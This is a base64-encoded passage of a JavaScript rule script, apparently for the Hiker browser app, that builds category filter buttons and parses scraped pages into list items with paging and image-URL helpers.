gICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJibGFua19ibG9ja1xcXFxcXFwiLFxcXFxuICAgICAgICAgIH0pO1xcXFxuICAgICAgICB9IGVsc2UgaWYgKGZvbGQgPT09IFxcXFxcXFwiMVxcXFxcXFwiIHx8IOaKmOWPoOeKtuaAgSA9PSBmYWxzZSkge1xcXFxuICAgICAgICAgIHN1Yl9jYXRlZ29yaWVzLmZvckVhY2goKGl0ZW0sIGtleSkgPT4ge1xcXFxuICAgICAgICAgICAgdmFyIGV4dHJhcG9zID0gZmFsc2U7XFxcXG4gICAgICAgICAgICAvKmlmIChpdGVtLmluY2x1ZGVzKCd0eXBlPVxcXFxcXFwiQGV4dHJhXFxcXFxcXCInKSkge1xcXFxuICAgICAgICAgICAgICBleHRyYXBvcyA9IHRydWU7XFxcXG4gICAgICAgICAgICAgIC8vbG9nKCfpmYTliqDlrprkvY0nKVxcXFxuICAgICAgICAgICAgfSovXFxcXG5cXFxcbiAgICAgICAgICAgIGlmIChleHRyYXBvcykge1xcXFxuICAgICAgICAgICAgICB2YXIgdGl0bGUgPSBwZGZoKGl0ZW0sIFxcXFxcXFwiYSYmVGV4dFxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgaWYgKHR5cGVvZiDmjpLpmaQgIT0gXFxcXFxcXCJ1bmRlZmluZWRcXFxcXFxcIiAmJiDmjpLpmaQgIT0gXFxcXFxcXCJcXFxcXFxcIikge1xcXFxuICAgICAgICAgICAgICAgIHRpdGxlID0gdGl0bGUucmVwbGFjZShuZXcgUmVnRXhwKOaOkumZpCwgXFxcXFxcXCJnXFxcXFxcXCIpLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICB2YXIganNvbiA9IHtcXFxcbiAgICAgICAgICAgICAgICB0eXBlOiBwZGZoKGl0ZW0sIFxcXFxcXFwiYSYmc3RhdGVcXFxcXFxcIiksXFxcXG4gICAgICAgICAgICAgICAgdmFsdWU6IHBkZmgoaXRlbSwgXFxcXFxcXCJhJiZ2YWx1ZVxcXFxcXFwiKSxcXFxcbiAgICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgIC8vdmFyIHRpdGxlID0gcGRmaChpdGVtLCDliIbnsbvmoIfpopgpO1xcXFxuICAgICAgICAgICAgICB2YXIgdGl0bGUgPSBpdGVtLnRpdGxlO1xcXFxuICAgICAgICAgICAgICBpZiAodHlwZW9mIOaOkumZpCAhPSBcXFxcXFxcInVuZGVmaW5lZFxcXFxcXFwiICYmIOaOkumZpCAhPSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGUgPSB0aXRsZS5yZXBsYWNlKG5ldyBSZWdFeHAo5o6S6ZmkLCBcXFxcXFxcImdcXFxcXFxcIiksIFxcXFxcXFwiXFxcXFxcXCIpO1xcXFxuICAgICAgICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgICAgICAgdmFyIGpzb24gPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICAvKnN3aXRjaCAodHJ1ZSkge1xcXFxuICAgICAgICAgICAgICAgIGNhc2Ug5YiG57G76ZO+5o6lLmluY2x1ZGVzKFxcXFxcXFwiQEBAXFxcXFxcXCIpOlxcXFxuICAgICAgICAgICAgICAgICAganNvbiA9IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdHlwZTogcGRmaChpdGVtLCDliIbnsbvpk77mjqUuc3BsaXQoXFxcXFxcXCJAQEBcXFxcXFxcIilbMF0pLFxcXFxuICAgICAgICAgICAgICAgICAgICB2YWx1ZTogcGRmaChpdGVtLCDliIbnsbvpk77mjqUuc3BsaXQoXFxcXFxcXCJAQEBcXFxcXFxcIilbMV0pLFxcXFxuICAgICAgICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgICAgIGNhc2Ug5YiG57G76ZO+5o6lLmluY2x1ZGVzKFxcXFxcXFwiQEBcXFxcXFxcIik6XFxcXG4gICAgICAgICAgICAgICAgICBqc29uID0ge1xcXFxuICAgICAgICAgICAgICAgICAgICB0eXBlOiDliIbnsbvpk77mjqUuc3BsaXQoXFxcXFxcXCJAQFxcXFxcXFwiKVswXSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFsdWU6IHBkZmgoaXRlbSwg5YiG57G76ZO+5o6lLnNwbGl0KFxcXFxcXFwiQEBcXFxcXFxcIilbMV0pLFxcXFxuICAgICAgICAgICAgICAgICAgfTtcXFxcbiAgICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgICAgIGRlZmF1bHQ6XFxcXG4gICAgICAgICAgICAgICAgICBqc29uID0gaXRlbS51cmw7XFxcXG4gICAgICAgICAgICAgICAgICAvLyBqc29uID0gcGQoaXRlbSwg5YiG57G76ZO+5o6lKTtcXFxcbiAgICAgICAgICAgICAgICAgIGJyZWFrO1xcXFxuICAgICAgICAgICAgICB9Ki9cXFxcbiAgICAgICAgICAgICAganNvbiA9IGl0ZW0udXJsO1xcXFxuICAgICAgICAgICAgICAvKnZhciBqc29uPeWIhuexu+mTvuaOpS5pbmNsdWRlcygnQEBAJyk/e1xcXFxuICAgICAgICAgICAgICAgICAgICB0eXBlOnBkZmgoaXRlbSzliIbnsbvpk77mjqUuc3BsaXQoJ0BAQCcpWzBdKSxcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFsdWU6cGRmaChpdGVtLOWIhuexu+mTvuaOpS5zcGxpdCgnQEBAJylbMV0pLFxcXFxuICAgICAgICAgICAgICAgIH06cGQoaXRlbSzliIbnsbvpk77mjqUpO1xcXFxuICAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgIGpzb2495YiG57G76ZO+5o6lLmluY2x1ZGVzKCdAQCcpP3tcXFxcbiAgICAgICAgICAgICAgICAgICAgdHlwZTrliIbnsbvpk77mjqUuc3BsaXQoJ0BAJylbMF0sXFxcXG4gICAgICAgICAgICAgICAgICAgIHZhbHVlOnBkZmgoaXRlbSzliIbnsbvpk77mjqUuc3BsaXQoJ0BAJylbMV0pLFxcXFxuICAgICAgICAgICAgICAgIH06cGQoaXRlbSzliIbnsbvpk77mjqUpOyovXFxcXG4gICAgICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgICAgIGxldCBwYXJhbXMgPSB7XFxcXG4gICAgICAgICAgICAgIGNhdGVfdGVtcDogY2F0ZV90ZW1wLFxcXFxuICAgICAgICAgICAgICBpbmRleDogaW5kZXgsXFxcXG4gICAgICAgICAgICAgIGtleToga2V5LFxcXFxuICAgICAgICAgICAgICBwYWdlOiBwYWdlLFxcXFxuICAgICAgICAgICAgICBqc29uOiBqc29uLFxcXFxuICAgICAgICAgICAgICBzdGF0ZTog54q25oCBLFxcXFxuICAgICAgICAgICAgICBhbGxjbGVhcnM6IOWFqOa4hSxcXFxcbiAgICAgICAgICAgIH07XFxcXG4gICAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgICB0aXRsZTogdGhpcy5zZXRUaXRsZShrZXkudG9TdHJpbmcoKSwgY2F0ZV90ZW1wW2luZGV4XSwgdGl0bGUpLFxcXFxuICAgICAgICAgICAgICB1cmw6ICQoXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCIgKyBcXFxcXFxcIiNub0xvYWRpbmcjXFxcXFxcXCIpLmxhenlSdWxlKChwYXJhbXMpID0+IHtcXFxcbiAgICAgICAgICAgICAgICBwYXJhbXMuYWxsY2xlYXJzLmZvckVhY2goKGl0ZW0pID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgIGNsZWFyTXlWYXIoaXRlbSk7XFxcXG4gICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgcGFyYW1zLmNhdGVfdGVtcFtwYXJhbXMuaW5kZXhdID0gcGFyYW1zLmtleS50b1N0cmluZygpO1xcXFxuICAgICAgICAgICAgICAgIHB1dE15VmFyKFxcXFxcXFwiaGVhZC5jYXRlXFxcXFxcXCIsIEpTT04uc3RyaW5naWZ5KHBhcmFtcy5jYXRlX3RlbXApKTtcXFxcbiAgICAgICAgICAgICAgICBpZiAocGFyYW1zLmpzb24uY29uc3RydWN0b3IgPT09IE9iamVjdCkge1xcXFxuICAgICAgICAgICAgICAgICAgcHV0TXlWYXIoXFxcXFxcXCJkdF9cXFxcXFxcIiArIHBhcmFtcy5qc29uLnR5cGUsIHBhcmFtcy5qc29uLnZhbHVlKTtcXFxcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xcXFxuICAgICAgICAgICAgICAgICAgcHV0TXlWYXIocGFyYW1zLnN0YXRlLCBwYXJhbXMuanNvbik7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHJlZnJlc2hQYWdlKCk7XFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICAgICAgICB9LCBwYXJhbXMpLFxcXFxuICAgICAgICAgICAgICBjb2xfdHlwZTogXFxcXFxcXCJzY3JvbGxfYnV0dG9uXFxcXFxcXCIsXFxcXG4gICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwiYmxhbmtfYmxvY2tcXFxcXFxcIixcXFxcbiAgICAgICAgICB9KTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgfSk7XFxcXG4gICAgfVxcXFxuICAgIH0sXFxcXG4gIH07XFxcXG4gIG9iai7pooTorr4ob3B0aW9ucyk7XFxcXG4gIHJldHVybiBvYmo7XFxcXG59XFxcXG5cXFxcbiAgLy8u54q25oCBKFxcXFxcXFwidXJsXFxcXFxcXCIpXFxcXG4gIC8vLueVjOmdoihkKVxcXFxuICAvLy7mupDnoIEoeGh0bWwpXFxcXG4gIC8vLuWFqOa4hShbXFxcXFxcXCIxXFxcXFxcXCIsIFxcXFxcXFwiMlxcXFxcXFwiXSlcXFxcbiAgLy8u5riF6ZmkKClcXFxcbiAgLy8u5byA5ZCv5oqY5Y+gKClcXFxcbiAgLy8u6aG156CBKHBhZ2UpXFxcXG4gIC8vLuWIm+W7uuWKqOaAgeWIhuexuyjlrprkvY3liJfooagpO1xcXFxuXFxcXG5mdW5jdGlvbiBnZXRPYmpmdWMob2JqKSB7XFxcXG4gIGNvbnN0IG1ldGhvZHMgPSBPYmplY3QuZ2V0T3duUHJvcGVydHlOYW1lcyhvYmopLmZpbHRlcihcXFxcbiAgICAobmFtZSkgPT4gdHlwZW9mIG9ialtuYW1lXSA9PT0gXFxcXFxcXCJmdW5jdGlvblxcXFxcXFwiXFxcXG4gICk7XFxcXG4gIGlmIChtZXRob2RzLmxlbmd0aCA9PSAwKSB7XFxcXG4gICAgY29uc29sZS5sb2cob2JqLnRvU3RyaW5nKCkpO1xcXFxuICAgIHJldHVybjtcXFxcbiAgfVxcXFxuICBjb25zdCBmb3JtYXR0ZWRTdHJpbmcgPSBtZXRob2RzXFxcXG4gICAgLm1hcCgobmFtZSkgPT4ge1xcXFxuICAgICAgY29uc3QgZm4gPSBvYmpbbmFtZV07XFxcXG4gICAgICBjb25zdCBmblN0cmluZyA9IGAke25hbWV9OiAke2ZuLnRvU3RyaW5nKCl9YDtcXFxcbiAgICAgIGNvbnN0IHJlc3RvcmVkRm5TdHJpbmcgPSBmblN0cmluZy5yZXBsYWNlKFxcXFxuICAgICAgICAvXFxcXFxcXFxcXFxcXFxcXHUoW1xcXFxcXFxcZFxcXFxcXFxcd117NH0pL2dpLFxcXFxuICAgICAgICBmdW5jdGlvbiAobWF0Y2gsIGdycCkge1xcXFxuICAgICAgICAgIHJldHVybiBTdHJpbmcuZnJvbUNoYXJDb2RlKHBhcnNlSW50KGdycCwgMTYpKTtcXFxcbiAgICAgICAgfVxcXFxuICAgICAgKTtcXFxcbiAgICAgIHJldHVybiByZXN0b3JlZEZuU3RyaW5nO1xcXFxuICAgIH0pXFxcXG4gICAgLmpvaW4oXFxcXFxcXCJcXFxcXFxcXG5cXFxcXFxcIik7XFxcXG4gIGNvbnNvbGUubG9nKGZvcm1hdHRlZFN0cmluZyk7XFxcXG59XFxcXG5cXFxcbi8qXFxcXG52ZXIgMjAyMy0wNi0xNiAgMS4wXFxcXG4qL1xcXFxudmFyIOeKtuaAgSA9XFxcXG4gIHR5cGVvZiDnirbmgIHmoIforrAgIT0gXFxcXFxcXCJ1bmRlZmluZWRcXFxcXFxcIiAmJiDnirbmgIHmoIforrAgIT0gXFxcXFxcXCJcXFxcXFxcIiA/IOeKtuaAgeagh+iusCA6IE1ZX1JVTEUudXJsO1xcXFxuXFxcXG5sZXQgZHRfZGVidWc9ZmFsc2U7ICBcXFxcbiAgXFxcXG5hZGRMaXN0ZW5lcihcXFxcbiAgXFxcXFxcXCJvbkNsb3NlXFxcXFxcXCIsXFxcXG4gICQudG9TdHJpbmcoKCkgPT4ge30pXFxcXG4pO1xcXFxuXFxcXG52YXIgQ3JlYXRlID0ge1xcXFxuICBzcGFnZToge1xcXFxuICAgIGdldDogZnVuY3Rpb24gKCkge1xcXFxuICAgICAgcmV0dXJuIHN0b3JhZ2UwLmdldE15VmFyKFxcXFxcXFwic3BhZ2VcXFxcXFxcIiwgXFxcXFxcXCJcXFxcXFxcIik7XFxcXG4gICAgfSxcXFxcbiAgICBzZXQ6IGZ1bmN0aW9uICh1cmwpIHtcXFxcbiAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKFxcXFxcXFwic3BhZ2VcXFxcXFxcIiwgdXJsKTtcXFxcbiAgICB9LFxcXFxuICB9LFxcXFxuICBuZXh0UGFnZTogZnVuY3Rpb24gKCkge1xcXFxuICAgIHZhciByZXN1bHQgPSBmYWxzZTtcXFxcbiAgICB0cnkge1xcXFxuICAgICAgdmFyIG5leHQgPSBldmFsKOS4i+S4gOmhtSk7XFxcXG4gICAgICAvL2xvZygnbjonK25leHQpXFxcXG4gICAgICBpZihuZXh0ID09XFxcXFxcXCJcXFxcXFxcIil7XFxcXG4gICAgICAgIHRocm93IG5ldyBFcnJvcign5LiL5LiA6aG16ZO+5o6l5Li656m6JylcXFxcbiAgICAgIH1cXFxcbiAgICAgIHJlc3VsdD10cnVlO1xcXFxuICAgICAgaWYodHJ1ZV91cmw9PW5leHQpe1xcXFxuICAgICAgICAgcmVzdWx0PWZhbHNlO1xcXFxuICAgICAgfVxcXFxuICAgIH0gY2F0Y2ggKGUpIHtcXFxcbiAgICAgIC8vbG9nKFxcXFxcXFwi5Y+v6IO95LiN5a2Y5Zyo5LiL5LiA6aG15oiW6ICF5LiL5LiA6aG15a6a5L2N5pyJ6Zeu6aKYXFxcXFxcXCIpO1xcXFxuICAgICAgbG9nKFxcXFxcXFwi6ZSZ6K+v5L+h5oGvOlxcXFxcXFwiICsgZS5tZXNzYWdlKTtcXFxcbiAgICB9XFxcXG4gICAgaWYgKChuZXh0ID09IFxcXFxcXFwiXFxcXFxcXCIgfHwgbmV4dCA9PSB1bmRlZmluZWQpICYmIHBhZ2UgPT0gMSkge1xcXFxuICAgICAgbmV4dCA9IHRydWVfdXJsO1xcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICAvL3Jlc3VsdD1mYWxzZTtcXFxcbiAgICAgIG5leHQgPSBnZXRNeVZhcijnirbmgIEpO1xcXFxuICAgIH1cXFxcbiAgICAvL2xvZygnbCcrdHJ1ZV91cmwpXFxcXG4gICAgLy9sb2coJ24nK25leHQpXFxcXG4gICAgaWYocGFnZSE9MSl7XFxcXG4gICAgaWYgKHRydWVfdXJsID09IG5leHQmJiFyZXN1bHQpIHtcXFxcbiAgICAgIHJlc3VsdCA9IGZhbHNlO1xcXFxuICAgIH0gZWxzZSB7XFxcXG4gICAgICByZXN1bHQgPSB0cnVlO1xcXFxuICAgICB9XFxcXG4gICAgfVxcXFxuICAgIHJldHVybiByZXN1bHQ7XFxcXG4gICAgLy9wdXRNeVZhcijnirbmgIEsIG5leHQpO1xcXFxuICB9LFxcXFxuICBnZXRCYWNrSW1hZ2U6IGZ1bmN0aW9uIChpbWd1cmwpIHtcXFxcbiAgICB2YXIgcmVzdWx0ID0gaW1ndXJsO1xcXFxuICAgIHRyeSB7XFxcXG4gICAgICByZXN1bHQgPSAvdXJsKD86XFxcXFxcXFxzKyk/XFxcXFxcXFwoKC4qPylcXFxcXFxcXCkvZ1xcXFxuICAgICAgICAuZXhlYyhpbWd1cmwpWzFdXFxcXG4gICAgICAgIC5yZXBsYWNlKC8oJ3xcXFxcXFxcInwmcXVvdDspL2dtLCBcXFxcXFxcIlxcXFxcXFwiKTtcXFxcbiAgICB9IGNhdGNoIHt9XFxcXG4gICAgcmV0dXJuIHJlc3VsdDtcXFxcbiAgfSxcXFxcbiAgaHR0cEhhbmRsZTogZnVuY3Rpb24gKGlucHV0KSB7XFxcXG4gICAgaWYgKGlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJodHRwXFxcXFxcXCIpKSB7XFxcXG4gICAgICByZXR1cm4gaW5wdXQ7XFxcXG4gICAgfSBlbHNlIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXFxcXFwiLy9cXFxcXFxcIikpIHtcXFxcbiAgICAgIHJldHVybiBcXFxcXFxcImh0dHBzOlxcXFxcXFwiICsgaW5wdXQ7XFxcXG4gICAgfSBlbHNlIGlmIChpbnB1dC5zdGFydHNXaXRoKFxcXFxcXFwiL1xcXFxcXFwiKSkge1xcXFxuICAgICAgcmV0dXJuIE1ZX0hPTUUgKyBpbnB1dDtcXFxcbiAgICB9XFxcXG4gIH0sXFxcXG4gIGltZ0hhbmRsZTogZnVuY3Rpb24gKGl0ZW0sIHJ1bGUpIHtcXFxcbiAgICB2YXIgaW1nID0gXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICBpZiAocnVsZS5pbWcuc3RhcnRzV2l0aChcXFxcXFxcInBkXFxcXFxcXCIpKSB7XFxcXG4gICAgICBpbWcgPSBldmFsKHJ1bGUuaW1nKTtcXFxcbiAgICB9IGVsc2UgaWYgKHJ1bGUuYmFja2ltZykge1xcXFxuICAgICAgaW1nID0gcGRmaChpdGVtLCBydWxlLmltZyk7XFxcXG4gICAgICBpbWcgPSB0aGlzLmdldEJhY2tJbWFnZShpbWcpO1xcXFxuICAgICAgaW1nID0gdGhpcy5odHRwSGFuZGxlKGltZyk7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgIGltZyA9IHBkZmgoaXRlbSwgcnVsZS5pbWcpO1xcXFxuICAgICAgaWYgKCFpbWcuc3RhcnRzV2l0aChcXFxcXFxcImh0dHBcXFxcXFxcIikpIHtcXFxcbiAgICAgICAgaW1nID0gcGQoaXRlbSwgcnVsZS5pbWcpO1xcXFxuICAgICAgICBpbWcgPSB0aGlzLmh0dHBIYW5kbGUoaW1nKTtcXFxcbiAgICAgIH1cXFxcbiAgICB9XFxcXG4gICAgcmV0dXJuIGltZyArIHJ1bGUucmVmO1xcXFxuICB9LFxcXFxuICB1cmxIYW5kbGU6IGZ1bmN0aW9uIChpdGVtLCBydWxlKSB7XFxcXG4gICAgdmFyIGhyZWYgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgIGlmIChydWxlLnVybC5zdGFydHNXaXRoKFxcXFxcXFwicGRcXFxcXFxcIikpIHtcXFxcbiAgICAgIGhyZWYgPSBldmFsKHJ1bGUudXJsKTtcXFxcbiAgICB9IGVsc2Uge1xcXFxuICAgICAgaHJlZiA9IHBkKGl0ZW0sIHJ1bGUudXJsKTtcXFxcbiAgICB9XFxcXG4gICAgaHJlZiA9IHJ1bGUuaW10ID8gaHJlZiArIFxcXFxcXFwiI2ltbWVyc2l2ZVRoZW1lI1xcXFxcXFwiIDogaHJlZjtcXFxcbiAgICByZXR1cm4gaHJlZjtcXFxcbiAgfSxcXFxcbiAgc2V0Q29udGVudDogZnVuY3Rpb24gKGl0ZW0sIGlucHV0KSB7XFxcXG4gICAgbGV0IG91dHB1dCA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgaWYgKGlucHV0ID09IHVuZGVmaW5lZCkge1xcXFxuICAgICAgcmV0dXJuIG91dHB1dDtcXFxcbiAgICB9XFxcXG4gICAgaWYgKGlucHV0LnN0YXJ0c1dpdGgoXFxcXFxcXCJwZFxcXFxcXFwiKSkge1xcXFxuICAgICAgb3V0cHV0ID0gZXZhbChpbnB1dCk7XFxcXG4gICAgfSBlbHNlIHtcXFxcbiAgICAgIG91dHB1dCA9IHBkZmgoaXRlbSwgaW5wdXQpO1xcXFxuICAgIH1cXFxcbiAgICByZXR1cm4gb3V0cHV0O1xcXFxuICB9LFxcXFxuICByZWZyZXNoOiBmdW5jdGlvbiAoKSB7XFxcXG4gICAgYWRkTGlzdGVuZXIoXFxcXG4gICAgICBcXFxcXFxcIm9uUmVmcmVzaFxcXFxcXFwiLFxcXFxuICAgICAgJC50b1N0cmluZygodSkgPT4ge1xcXFxuICAgICAgICBjbGVhck15VmFyKFxcXFxcXFwieWlsaXN0XFxcXFxcXCIpO1xcXFxuICAgICAgICAvL3ZhciBwID0gc3RvcmFnZTAuZ2V0TXlWYXIoJ3NwYWdlJywgJycpO1xcXFxuICAgICAgICAvL3B1dE15VmFyKHUsIHApO1xcXFxuICAgICAgfSwg54q25oCBKVxcXFxuICAgICk7XFxcXG4gIH0sXFxcXG4gIGpzb25MaXN0OiBmdW5jdGlvbiAoYXJyLCBqc29uLCBydWxlKSB7XFxcXG4gICAgaWYgKGpzb24uY29uc3RydWN0b3IgIT0gT2JqZWN0KSB7XFxcXG4gICAgICB0cnkge1xcXFxuICAgICAgICBqc29uID0gSlNPTi5wYXJzZShqc29uKTtcXFxcbiAgICAgIH0gY2F0Y2gge31cXFxcbiAgICB9XFxcXG4gICAganNvbltydWxlLmxpc3RdLmZvckVhY2goKGl0ZW0pID0+IHtcXFxcbiAgICAgIHZhciBpbWcgPSBldmFsKHJ1bGUuaW1nKSArIHJ1bGUucmVmO1xcXFxuICAgICAgdmFyIGhyZWYgPSBldmFsKHJ1bGUudXJsKTtcXFxcbiAgICAgIGhyZWYgPSBydWxlLmltdCA/IGhyZWYgKyBcXFxcXFxcIiNpbW1lcnNpdmVUaGVtZSNcXFxcXFxcIiA6IGhyZWY7XFxcXG4gICAgICB2YXIgbGF6eSA9IHJ1bGUubGF6eSA/IHJ1bGUubGF6eSA6IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgICB2YXIgZGQgPSB7XFxcXG4gICAgICAgIHRpdGxlOiBldmFsKHJ1bGUudGl0bGUpLFxcXFxuICAgICAgICBkZXNjOiBldmFsKHJ1bGUuZGVzYyksXFxcXG4gICAgICAgIGNvbnRlbnQ6IGV2YWwocnVsZS5jb250ZW50KSxcXFxcbiAgICAgICAgcGljX3VybDogaW1nLFxcXFxuICAgICAgICB1cmw6IFxcXFxcXFwiaGlrZXI6Ly9lbXB0eSMjXFxcXFxcXCIgKyBocmVmLFxcXFxuICAgICAgICBjb2xfdHlwZTogcnVsZS5jb2xfdHlwZSxcXFxcbiAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICBpbWc6IGltZyxcXFxcbiAgICAgICAgfSxcXFxcbiAgICAgIH07XFxcXG4gICAgICBpZiAobGF6eSAhPSBcXFxcXFxcIlxcXFxcXFwiKSB7XFxcXG4gICAgICAgIGRkW1xcXFxcXFwidXJsXFxcXFxcXCJdID0gaHJlZiArIGxhenk7XFxcXG4gICAgICB9XFxcXG4gICAgICBhcnIucHVzaChkZCk7XFxcXG4gICAgfSk7XFxcXG4gIH0sXFxcXG4gIHJ1bGVMaXN0OiBmdW5jdGlvbiAoYXJyLCBodG1sLCBydWxlKSB7XFxcXG4gICAgdmFyIGxpc3QgPSBwZGZhKGh0bWwsIHJ1bGUubGlzdCk7XFxcXG4gICAgbGlzdC5mb3JFYWNoKChpdGVtLCBpKSA9PiB7XFxcXG4gICAgICB2YXIgdGl0bGUgPSB0aGlzLnNldENvbnRlbnQoaXRlbSwgcnVsZS50aXRsZSk7XFxcXG4gICAgICB2YXIgZGVzYyA9IHRoaXMuc2V0Q29udGVudChpdGVtLCBydWxlLmRlc2MpO1xcXFxuICAgICAgdmFyIGltZyA9IHRoaXMuaW1nSGFuZGxlKGl0ZW0sIHJ1bGUpO1xcXFxuICAgICAgdmFyIHVybCA9IHRoaXMudXJsSGFuZGxlKGl0ZW0sIHJ1bGUpO1xcXFxuICAgICAgdmFyIGNvbnRlbnQgPSB0aGlzLnNldENvbnRlbnQoaXRlbSwgcnVsZS5jb250ZW50KTtcXFxcbiAgICAgIHZhciBsYXp5ID0gcnVsZS5sYXp5ID8gcnVsZS5sYXp5IDogXFxcXFxcXCJcXFxcXFxcIjtcXFxcbiAgICAgIHZhciBkZCA9IHtcXFxcbiAgICAgICAgdGl0bGU6IHRpdGxlLFxcXFxuICAgICAgICBkZXNjOiBkZXNjLFxcXFxuICAgICAgICBwaWNfdXJsOiBpbWcsXFxcXG4gICAgICAgIHVybDogXFxcXFxcXCJoaWtlcjovL2VtcHR5IyNcXFxcXFxcIiArIHVybCxcXFxcbiAgICAgICAgY29udGVudDogY29udGVudCxcXFxcbiAgICAgICAgY29sX3R5cGU6IHJ1bGUuY29sX3R5cGUsXFxcXG4gICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgaW1nOiBpbWcsXFxcXG4gICAgICAgIH0sXFxcXG4gICAgICB9O1xcXFxuICAgICAgaWYgKGxhenkgIT0gXFxcXFxcXCJcXFxcXFxcIikge1xcXFxuICAgICAgICBkZFtcXFxcXFxcInVybFxcXFxcXFwiXSA9IHVybCArIGxhenk7XFxcXG4gICAgICB9XFxcXG4gICAgICBhcnIucHVzaChkZCk7XFxcXG4gICAgfSk7XFxcXG4gIH0sXFxcXG4gIExpc3Q6IGZ1bmN0aW9uIChhcnIsIGh0bWwsIHJ1bGUsIHBhcmFtKSB7XFxcXG4gICAgcGFyYW0gPSBwYXJhbSA/IHBhcmFtIDoge307XFxcXG4gICAgdmFyIGF1dG8gPSBwYXJhbS5hdXRvID8gcGFyYW0uYXV0byA6IGZhbHNlO1xcXFxuICAgIHZhciBzaG93ID0gcGFyYW0uc2hvdyA/IHBhcmFtLnNob3cgOiBmYWxzZTtcXFxcbiAgICBpZiAocGFnZSA9PSAxKSB7XFxcXG4gICAgICAvL3RoaXMuc3BhZ2Uuc2V0KHRydWVfdXJsKTtcXFxcbiAgICB9XFxcXG4gICAgdGhpcy5yZWZyZXNoKCk7XFxcXG4gICAgdmFyIGxpc3QgPSBwZGZhKGh0bWwsIHJ1bGUubGlzdCk7XFxcXG4gICAgLy9sb2codGhpcy5uZXh0UGFnZSgpKVxcXFxuICAgIGlmICgoc3RvcmFnZTAuZ2V0TXlWYXIoJ3lpX2lzbmV4dCcsJ3QnKT09J3QnJiZsaXN0Lmxlbmd0aCA+IDApIHx8IHBhZ2UgPT0gMSkge1xcXFxuICAgICAgbGlzdC5mb3JFYWNoKChpdGVtLCBpKSA9PiB7XFxcXG4gICAgICAgIGRlbGV0ZUl0ZW0oXFxcXFxcXCJwYWdlbnVtXFxcXFxcXCIpO1xcXFxuICAgICAgICBkZWxldGVJdGVtKFxcXFxcXFwicGFnZWxpbmVcXFxcXFxcIik7XFxcXG4gICAgICAgIHZhciBpZCA9IFxcXFxcXFwiXFxcXFxcXCI7XFxcXG4gICAgICAgIHZhciBjbHMgPSBcXFxcXFxcIlxcXFxcXFwiO1xcXFxuICAgICAgICB2YXIgdGl0bGUgPSB0aGlzLnNldENvbnRlbnQoaXRlbSwgcnVsZS50aXRsZSk7XFxcXG4gICAgICAgIHZhciBkZXNjID0gdGhpcy5zZXRDb250ZW50KGl0ZW0sIHJ1bGUuZGVzYyk7XFxcXG4gICAgICAgIHZhciBpbWcgPSB0aGlzLmltZ0hhbmRsZShpdGVtLCBydWxlKTtcXFxcbiAgICAgICAgdmFyIHVybCA9IHRoaXMudXJsSGFuZGxlKGl0ZW0sIHJ1bGUpO1xcXFxuICAgICAgICB2YXIgY29udGVudCA9IHRoaXMuc2V0Q29udGVudChpdGVtLCBydWxlLmNvbnRlbnQpO1xcXFxuICAgICAgICBpZiAoaSA9PSBsaXN0Lmxlbmd0aCAtIDEpIHtcXFxcbiAgICAgICAgICBpZCA9IFxcXFxcXFwibGFzdGlkX1xcXFxcXFwiICsgcGFnZTtcXFxcbiAgICAgICAgICBjbHMgPSBcXFxcXFxcImxhc3RtYXJrXFxcXFxcXCI7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICB0aXRsZTogdGl0bGUsXFxcXG4gICAgICAgICAgZGVzYzogZGVzYyxcXFxcbiAgICAgICAgICBwaWNfdXJsOiBpbWcsXFxcXG4gICAgICAgICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vZW1wdHkjI1xcXFxcXFwiICsgdXJsLFxcXFxuICAgICAgICAgIGNvbnRlbnQ6IGNvbnRlbnQsXFxcXG4gICAgICAgICAgY29sX3R5cGU6IHJ1bGUuY29sX3R5cGUsXFxcXG4gICAgICAgICAgZXh0cmE6IHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiB0aXRsZSxcXFxcbiAgICAgICAgICAgIGltZzogaW1nLFxcXFxuICAgICAgICAgICAgaWQ6IGlkL